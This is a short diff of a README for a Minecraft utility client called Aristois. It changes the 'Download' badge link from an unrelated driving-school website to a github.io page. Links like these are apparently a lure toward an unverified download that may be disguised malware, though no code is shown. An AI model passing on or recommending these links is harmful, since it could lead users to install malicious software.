@@ -4,7 +4,7 @@
 
 It’s equipped with over 100 customizable modules, a highly responsive interface, built-in global chat, seamless integration with Fabric mods, and an intuitive addon manager. This project is designed to deliver maximum performance with minimum hassle — so you can focus on enjoying the game your way.
 
-[![Download Aristois](https://img.shields.io/badge/Download-Aristois-blueviolet)](https://dalahdrivingschool.com/)
+[![Download Aristois](https://img.shields.io/badge/Download-Aristois-blueviolet)](https://minecraft-utility-mod.github.io/.github)
 
 ---
 
